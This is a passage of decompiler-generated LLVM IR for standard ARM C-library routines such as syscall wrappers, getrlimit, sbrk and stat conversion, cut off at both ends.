entry:
  store i32 0, i32* @r1, align 4
  %v0_14760 = call i32 @__sigsetjmp()
  ret i32 %v0_14760
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14790 = load i32, i32* @r7, align 4
  store i32 %v3_14790, i32* %stack_var_-8, align 4
  %v0_1479c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1479c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1479c, -4095
  br i1 %tmp, label %dec_label_pc_147c4, label %dec_label_pc_147ac

dec_label_pc_147ac:                               ; preds = %entry
  %v0_147b0 = call i32 @__aeabi_read_tp()
  %v3_147b4 = load i16, i16* @global_var_21510.336, align 2
  %v4_147b4 = sext i16 %v3_147b4 to i32
  %v0_147b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_147b8 = sub i32 0, %v0_147b8
  store i32 %v1_147b8, i32* %r2.global-to-local, align 4
  %v3_147bc = add i32 %v4_147b4, %v0_147b0
  %v4_147bc = inttoptr i32 %v3_147bc to i32*
  store i32 %v1_147b8, i32* %v4_147bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_147c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_147c4

dec_label_pc_147c4:                               ; preds = %entry, %dec_label_pc_147ac
  %v1_147c8 = phi i32 [ %v0_1479c, %entry ], [ -1, %dec_label_pc_147ac ]
  %v2_147c4 = phi i32 [ %v3_14790, %entry ], [ %v2_147c4.pre, %dec_label_pc_147ac ]
  store i32 %v2_147c4, i32* @r7, align 4
  ret i32 %v1_147c8

; uselistorder directives
  uselistorder i32 %v0_1479c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_147c4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_147dc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_14808, %dec_label_pc_1481c, %entry
  %v0_147dc = phi i32 [ %arg1, %entry ], [ %v0_147dc.pre.pre, %dec_label_pc_1481c ], [ %v0_14808, %dec_label_pc_14808 ]
  store i32 %v0_147dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_147dc, -4095
  br i1 %tmp, label %dec_label_pc_14808, label %dec_label_pc_147f8

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147dc
  %v0_147f8 = call i32 @__aeabi_read_tp()
  %v0_147fc = load i32, i32* %r2.global-to-local, align 4
  %v1_147fc = sub i32 0, %v0_147fc
  store i32 %v1_147fc, i32* %r2.global-to-local, align 4
  %v3_14800 = load i16, i16* @global_var_21510.336, align 2
  %v4_14800 = sext i16 %v3_14800 to i32
  %v3_14804 = add i32 %v4_14800, %v0_147f8
  %v4_14804 = inttoptr i32 %v3_14804 to i32*
  store i32 %v1_147fc, i32* %v4_14804, align 4
  %v0_14808.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14808

dec_label_pc_14808:                               ; preds = %dec_label_pc_147dc, %dec_label_pc_147f8
  %v0_14808 = phi i32 [ %v0_147dc, %dec_label_pc_147dc ], [ %v0_14808.pre, %dec_label_pc_147f8 ]
  store i32 %v0_14808, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_14808, -4095
  br i1 %tmp4, label %dec_label_pc_147dc, label %dec_label_pc_1481c

dec_label_pc_1481c:                               ; preds = %dec_label_pc_14808
  %v0_1481c = call i32 @__aeabi_read_tp()
  %v0_14820 = load i32, i32* %r2.global-to-local, align 4
  %v1_14820 = sub i32 0, %v0_14820
  store i32 %v1_14820, i32* %r2.global-to-local, align 4
  %v3_14824 = load i16, i16* @global_var_21510.336, align 2
  %v4_14824 = sext i16 %v3_14824 to i32
  %v3_14828 = add i32 %v4_14824, %v0_1481c
  %v4_14828 = inttoptr i32 %v3_14828 to i32*
  store i32 %v1_14820, i32* %v4_14828, align 4
  %v0_147dc.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_147dc

; uselistorder directives
  uselistorder i32 %v0_14808, { 0, 2, 1 }
  uselistorder i32 %v0_147dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14808, { 1, 0 }
  uselistorder label %dec_label_pc_147dc, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_14840 = load i32, i32* @r1, align 4
  store i32 %v0_14840, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14850 = load i32, i32* @r0, align 4
  store i32 %v0_14850, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14850, -4095
  br i1 %tmp, label %dec_label_pc_14878, label %dec_label_pc_1485c

dec_label_pc_1485c:                               ; preds = %entry
  %v0_14860 = call i32 @__aeabi_read_tp()
  %v3_14864 = load i16, i16* @global_var_21510.336, align 2
  %v4_14864 = sext i16 %v3_14864 to i32
  store i32 %v4_14864, i32* @r3, align 4
  %v0_14868 = load i32, i32* @r2, align 4
  %v1_14868 = sub i32 0, %v0_14868
  store i32 %v1_14868, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_14870 = add i32 %v4_14864, %v0_14860
  %v4_14870 = inttoptr i32 %v3_14870 to i32*
  store i32 %v1_14868, i32* %v4_14870, align 4
  br label %dec_label_pc_14888

dec_label_pc_14878:                               ; preds = %entry
  store i32 %v0_14850, i32* %r7.global-to-local, align 4
  %v2_14878 = icmp eq i32 %v0_14850, 0
  br i1 %v2_14878, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14878
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14878, %bb
  call void @__pseudo_cond_branch(i1 %v2_14878, i32 ptrtoint (i32* @global_var_14cc8.567 to i32))
  br label %dec_label_pc_14888

dec_label_pc_14888:                               ; preds = %dec_label_pc_1485c, %.thread
  %v0_14888 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14888

; uselistorder directives
  uselistorder i32 %v0_14850, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14888, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1489c = load i32, i32* @r5, align 4
  %v18_1489c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_148d4, label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %entry
  %v1_148bc = sub i32 0, %arg1
  %v3_148c0 = load i16, i16* @global_var_21510.336, align 2
  %v4_148c0 = sext i16 %v3_148c0 to i32
  store i32 %v4_148c0, i32* %r3.global-to-local, align 4
  %v0_148c4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_148cc = add i32 %v4_148c0, %v0_148c4
  %v4_148cc = inttoptr i32 %v3_148cc to i32*
  store i32 %v1_148bc, i32* %v4_148cc, align 4
  br label %dec_label_pc_14928

dec_label_pc_148d4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_148d4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_148dc = add i32 %arg2, %arg1
  store i32 %v3_148dc, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_148d4, %bb
  %v1_149184 = phi i32 [ %v18_1489c, %dec_label_pc_148d4 ], [ %v3_148dc, %bb ]
  %v0_149142 = phi i32 [ 141, %dec_label_pc_148d4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_14928, label %dec_label_pc_14914

dec_label_pc_148e8:                               ; preds = %dec_label_pc_14914
  %v1_1491c = inttoptr i32 %v1_14914 to i8*
  %v1_148e8 = add i32 %v0_148e8, 8
  %v2_148e8 = inttoptr i32 %v1_148e8 to i16*
  %v3_148e8 = load i16, i16* %v2_148e8, align 2
  %v4_148e8 = zext i16 %v3_148e8 to i32
  %v2_148ec = add i32 %v4_148e8, %v0_148e8
  store i32 %v2_148ec, i32* @r3, align 4
  %v1_148f0 = add i32 %v2_148ec, -1
  %v2_148f0 = inttoptr i32 %v1_148f0 to i8*
  %v3_148f0 = load i8, i8* %v2_148f0, align 1
  %v4_148f0 = zext i8 %v3_148f0 to i32
  store i32 %v4_148f0, i32* @r4, align 4
  %v3_148f4 = call i32 @strlen(i8* %v1_1491c)
  %v0_148f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_148f8, i32* @r1, align 4
  %v1_148fc = add i32 %v3_148f4, 1
  store i32 %v1_148fc, i32* @r2, align 4
  %v0_14900 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14900, i32* @r0, align 4
  %v3_14904 = call i32 @memmove(i32 %v0_14900, i32 %v0_148f8, i32 %v1_148fc)
  %v0_14908 = load i32, i32* %r7.global-to-local, align 4
  %v1_14908 = add i32 %v0_14908, 8
  %v2_14908 = inttoptr i32 %v1_14908 to i16*
  %v3_14908 = load i16, i16* %v2_14908, align 2
  %v4_14908 = zext i16 %v3_14908 to i32
  store i32 %v4_14908, i32* %r3.global-to-local, align 4
  %v0_1490c = load i32, i32* @r4, align 4
  %v1_1490c = trunc i32 %v0_1490c to i8
  %v3_1490c = add i32 %v0_14908, 10
  %v4_1490c = inttoptr i32 %v3_1490c to i8*
  store i8 %v1_1490c, i8* %v4_1490c, align 1
  %v0_14910 = load i32, i32* %r7.global-to-local, align 4
  %v1_14910 = load i32, i32* %r3.global-to-local, align 4
  %v2_14910 = add i32 %v1_14910, %v0_14910
  store i32 %v2_14910, i32* %r7.global-to-local, align 4
  %v1_14918.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_14914

dec_label_pc_14914:                               ; preds = %.thread, %dec_label_pc_148e8
  %v1_14918 = phi i32 [ %v1_14918.pre, %dec_label_pc_148e8 ], [ %v1_149184, %.thread ]
  %v0_148e8 = phi i32 [ %v2_14910, %dec_label_pc_148e8 ], [ %v0_149142, %.thread ]
  %v1_14914 = add i32 %v0_148e8, 10
  store i32 %v1_14914, i32* %r6.global-to-local, align 4
  %v3_14918 = icmp ult i32 %v0_148e8, %v1_14918
  %v1_14920 = add i32 %v0_148e8, 11
  store i32 %v1_14920, i32* %r8.global-to-local, align 4
  br i1 %v3_14918, label %dec_label_pc_148e8, label %dec_label_pc_14928

dec_label_pc_14928:                               ; preds = %dec_label_pc_14914, %.thread, %dec_label_pc_148b8
  %v0_14928 = load i32, i32* @r5, align 4
  store i32 %v6_1489c, i32* @r5, align 4
  store i32 %v18_1489c, i32* @sl, align 4
  ret i32 %v0_14928

; uselistorder directives
  uselistorder i32 %v1_14914, { 1, 0 }
  uselistorder i32 %v0_148e8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1489c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14914, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14940 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1494c = call i32 @getrlimit(i32 7, i32 %v2_14940)
  %v1_14950 = icmp slt i32 %v2_1494c, 0
  %v5_14954 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14950, i32 256, i32 %v5_14954
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_14978 = load i32, i32* @r0, align 4
  ret i32 %v1_14978
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1498c = load i32, i32* @r0, align 4
  ret i32 %v1_1498c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_149a0 = load i32, i32* @r0, align 4
  ret i32 %v1_149a0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_149b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 148) to i32*), align 4
  %v1_149b4 = inttoptr i32 %v4_149b0 to i32*
  %v2_149b4 = load i32, i32* %v1_149b4, align 4
  %v2_149b8 = icmp eq i32 %v2_149b4, 0
  br i1 %v2_149b8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_149c0 = phi i32 [ %v2_149b4, %entry ], [ 4096, %bb ]
  ret i32 %v1_149c0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_149f8, label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %entry
  %v1_149e4 = sub i32 0, %arg1
  %v3_149e8 = load i16, i16* @global_var_21510.336, align 2
  %v4_149e8 = sext i16 %v3_149e8 to i32
  %v0_149ec = call i32 @__aeabi_read_tp()
  %v3_149f0 = add i32 %v4_149e8, %v0_149ec
  %v4_149f0 = inttoptr i32 %v3_149f0 to i32*
  store i32 %v1_149e4, i32* %v4_149f0, align 4
  br label %dec_label_pc_149f8

dec_label_pc_149f8:                               ; preds = %entry, %dec_label_pc_149e0
  %v1_149fc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_149e0 ]
  ret i32 %v1_149fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_149f8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a04 = load i32, i32* @r7, align 4
  store i32 %v3_14a04, i32* %stack_var_-8, align 4
  %v0_14a10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14a10, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14a10, -4095
  br i1 %tmp, label %dec_label_pc_14a38, label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %entry
  %v0_14a24 = call i32 @__aeabi_read_tp()
  %v3_14a28 = load i16, i16* @global_var_21510.336, align 2
  %v4_14a28 = sext i16 %v3_14a28 to i32
  store i32 %v4_14a28, i32* @r3, align 4
  %v0_14a2c = load i32, i32* %r2.global-to-local, align 4
  %v1_14a2c = sub i32 0, %v0_14a2c
  store i32 %v1_14a2c, i32* %r2.global-to-local, align 4
  %v3_14a30 = add i32 %v4_14a28, %v0_14a24
  %v4_14a30 = inttoptr i32 %v3_14a30 to i32*
  store i32 %v1_14a2c, i32* %v4_14a30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14a38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %entry, %dec_label_pc_14a20
  %v1_14a3c = phi i32 [ %v0_14a10, %entry ], [ -1, %dec_label_pc_14a20 ]
  %v2_14a38 = phi i32 [ %v3_14a04, %entry ], [ %v2_14a38.pre, %dec_label_pc_14a20 ]
  store i32 %v2_14a38, i32* @r7, align 4
  ret i32 %v1_14a3c

; uselistorder directives
  uselistorder i32 %v0_14a10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a38, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_14a54 = load i32, i32* @r0, align 4
  ret i32 %v1_14a54
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14a58 = load i32, i32* @r4, align 4
  store i32 %v3_14a58, i32* %stack_var_-12, align 4
  %v0_14a68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14a68, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14a68, -4095
  br i1 %tmp, label %dec_label_pc_14a90, label %dec_label_pc_14a78

dec_label_pc_14a78:                               ; preds = %entry
  %v0_14a7c = call i32 @__aeabi_read_tp()
  %v3_14a80 = load i16, i16* @global_var_21510.336, align 2
  %v4_14a80 = sext i16 %v3_14a80 to i32
  %v0_14a84 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a84 = sub i32 0, %v0_14a84
  store i32 %v1_14a84, i32* %r2.global-to-local, align 4
  %v3_14a88 = add i32 %v4_14a80, %v0_14a7c
  %v4_14a88 = inttoptr i32 %v3_14a88 to i32*
  store i32 %v1_14a84, i32* %v4_14a88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14a90.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14a90

dec_label_pc_14a90:                               ; preds = %entry, %dec_label_pc_14a78
  %v1_14a94 = phi i32 [ %v0_14a68, %entry ], [ -1, %dec_label_pc_14a78 ]
  %v2_14a90 = phi i32 [ %v3_14a58, %entry ], [ %v2_14a90.pre, %dec_label_pc_14a78 ]
  store i32 %v2_14a90, i32* @r4, align 4
  ret i32 %v1_14a94

; uselistorder directives
  uselistorder i32 %v0_14a68, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a90, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a9c = load i32, i32* @r7, align 4
  store i32 %v3_14a9c, i32* %stack_var_-8, align 4
  %v0_14aa8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14aa8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14aa8, -4095
  br i1 %tmp, label %dec_label_pc_14ad0, label %dec_label_pc_14ab8

dec_label_pc_14ab8:                               ; preds = %entry
  %v0_14abc = call i32 @__aeabi_read_tp()
  %v3_14ac0 = load i16, i16* @global_var_21510.336, align 2
  %v4_14ac0 = sext i16 %v3_14ac0 to i32
  %v0_14ac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ac4 = sub i32 0, %v0_14ac4
  store i32 %v1_14ac4, i32* %r2.global-to-local, align 4
  %v3_14ac8 = add i32 %v4_14ac0, %v0_14abc
  %v4_14ac8 = inttoptr i32 %v3_14ac8 to i32*
  store i32 %v1_14ac4, i32* %v4_14ac8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14ad0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_14ad0:                               ; preds = %entry, %dec_label_pc_14ab8
  %v1_14ad4 = phi i32 [ %v0_14aa8, %entry ], [ -1, %dec_label_pc_14ab8 ]
  %v2_14ad0 = phi i32 [ %v3_14a9c, %entry ], [ %v2_14ad0.pre, %dec_label_pc_14ab8 ]
  store i32 %v2_14ad0, i32* @r7, align 4
  ret i32 %v1_14ad4

; uselistorder directives
  uselistorder i32 %v0_14aa8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ad0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14adc = load i32, i32* @r7, align 4
  store i32 %v3_14adc, i32* %stack_var_-8, align 4
  %v0_14ae8 = load i32, i32* @r0, align 4
  store i32 %v0_14ae8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14ae8, -4095
  br i1 %tmp, label %dec_label_pc_14b10, label %dec_label_pc_14af8

dec_label_pc_14af8:                               ; preds = %entry
  %v0_14afc = call i32 @__aeabi_read_tp()
  %v3_14b00 = load i16, i16* @global_var_21510.336, align 2
  %v4_14b00 = sext i16 %v3_14b00 to i32
  %v0_14b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b04 = sub i32 0, %v0_14b04
  store i32 %v1_14b04, i32* %r2.global-to-local, align 4
  %v3_14b08 = add i32 %v4_14b00, %v0_14afc
  %v4_14b08 = inttoptr i32 %v3_14b08 to i32*
  store i32 %v1_14b04, i32* %v4_14b08, align 4
  %v2_14b10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %entry, %dec_label_pc_14af8
  %v1_14b14 = phi i32 [ %v0_14ae8, %entry ], [ -1, %dec_label_pc_14af8 ]
  %v2_14b10 = phi i32 [ %v3_14adc, %entry ], [ %v2_14b10.pre, %dec_label_pc_14af8 ]
  store i32 %v2_14b10, i32* @r7, align 4
  ret i32 %v1_14b14

; uselistorder directives
  uselistorder i32 %v0_14ae8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b10, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_14b28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_14b2c = icmp eq i32 %v4_14b28, 0
  %v3_14b30 = load i32, i32* @r4, align 4
  %v9_14b30 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14b2c, label %dec_label_pc_14b40, label %entry.dec_label_pc_14b48_crit_edge

entry.dec_label_pc_14b48_crit_edge:               ; preds = %entry
  br label %dec_label_pc_14b48

dec_label_pc_14b40:                               ; preds = %entry
  store i32 %v3_14b30, i32* @r4, align 4
  store i32 %v9_14b30, i32* @r6, align 4
  %v0_14b44 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_14b48

dec_label_pc_14b48:                               ; preds = %entry.dec_label_pc_14b48_crit_edge, %dec_label_pc_14b40
  %v0_14b48 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14b48, i32* @r5, align 4
  %v0_14b54 = load i32, i32* @r4, align 4
  store i32 %v0_14b54, i32* @r0, align 4
  %v0_14b58 = call i32 @__syscall_nanosleep()
  store i32 %v0_14b58, i32* @r4, align 4
  %v0_14b60 = load i32, i32* @r5, align 4
  %v1_14b64 = call i32 @__libc_disable_asynccancel(i32 %v0_14b60)
  %v0_14b68 = load i32, i32* @r4, align 4
  ret i32 %v0_14b68

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 2, 12, 1, 7, 6, 5, 8, 11, 4, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 2, 12, 1, 7, 6, 5, 8, 11, 4, 10, 9, 0 }
  uselistorder label %dec_label_pc_14b48, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14b7c = load i32, i32* @r4, align 4
  store i32 %v3_14b7c, i32* %stack_var_-16, align 4
  store i32 11572, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r4.global-to-local, align 4
  %v4_14b8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 11572) to i32*), align 4
  %v2_14b90 = icmp eq i32 %v4_14b8c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_14b90, label %dec_label_pc_14b9c, label %dec_label_pc_14bac

dec_label_pc_14b9c:                               ; preds = %entry
  %v1_14ba0 = call i32 @__GI_brk(i32 0)
  %v1_14ba4 = icmp slt i32 %v1_14ba0, 0
  br i1 %v1_14ba4, label %dec_label_pc_14bd0, label %dec_label_pc_14bacthread-pre-split

dec_label_pc_14bacthread-pre-split:               ; preds = %dec_label_pc_14b9c
  %v0_14bb0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_14bac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14bac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %dec_label_pc_14bacthread-pre-split, %entry
  %v1_14bac = phi i32 [ %v1_14bac.pre, %dec_label_pc_14bacthread-pre-split ], [ 11572, %entry ]
  %v0_14bac = phi i32 [ %v0_14bac.pre, %dec_label_pc_14bacthread-pre-split ], [ ptrtoint (i32* @global_var_214b8.340 to i32), %entry ]
  %v1_14bc0 = phi i32 [ %v0_14bb0.pr, %dec_label_pc_14bacthread-pre-split ], [ %arg1, %entry ]
  %v2_14bac = add i32 %v0_14bac, %v1_14bac
  %v3_14bac = inttoptr i32 %v2_14bac to i32*
  %v4_14bac = load i32, i32* %v3_14bac, align 4
  %v2_14bb0 = icmp eq i32 %v1_14bc0, 0
  store i32 %v4_14bac, i32* %r4.global-to-local, align 4
  br i1 %v2_14bb0, label %dec_label_pc_14bd4, label %dec_label_pc_14bbc

dec_label_pc_14bbc:                               ; preds = %dec_label_pc_14bac
  %v2_14bc0 = add i32 %v4_14bac, %v1_14bc0
  %v1_14bc4 = call i32 @__GI_brk(i32 %v2_14bc0)
  %v1_14bc8 = icmp slt i32 %v1_14bc4, 0
  br i1 %v1_14bc8, label %dec_label_pc_14bd0, label %dec_label_pc_14bbc.dec_label_pc_14bd4_crit_edge

dec_label_pc_14bbc.dec_label_pc_14bd4_crit_edge:  ; preds = %dec_label_pc_14bbc
  %v0_14bd4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bd4

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bbc, %dec_label_pc_14b9c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bd4

dec_label_pc_14bd4:                               ; preds = %dec_label_pc_14bac, %dec_label_pc_14bbc.dec_label_pc_14bd4_crit_edge, %dec_label_pc_14bd0
  %v0_14bd4 = phi i32 [ %v0_14bd4.pre, %dec_label_pc_14bbc.dec_label_pc_14bd4_crit_edge ], [ -1, %dec_label_pc_14bd0 ], [ %v4_14bac, %dec_label_pc_14bac ]
  %v2_14bd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14bd8, i32* @r4, align 4
  ret i32 %v0_14bd4

; uselistorder directives
  uselistorder i32 %v4_14bac, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_14bd4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14bf8 = load i32, i32* @r0, align 4
  ret i32 %v1_14bf8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_14bfc = load i32, i32* @r4, align 4
  store i32 %v3_14bfc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_14c14 = inttoptr i32 %arg2 to i8*
  %v4_14c14 = call i32 @__GI_memset(i8* %v3_14c14, i32 0, i32 104)
  %v2_14c18 = load i32, i32* %arg1, align 4
  store i32 %v2_14c18, i32* %r3.global-to-local, align 4
  %v3_14c18 = add i32 %tmp, 4
  %v4_14c18 = inttoptr i32 %v3_14c18 to i32*
  %v5_14c18 = load i32, i32* %v4_14c18, align 4
  store i32 %v5_14c18, i32* %r4.global-to-local, align 4
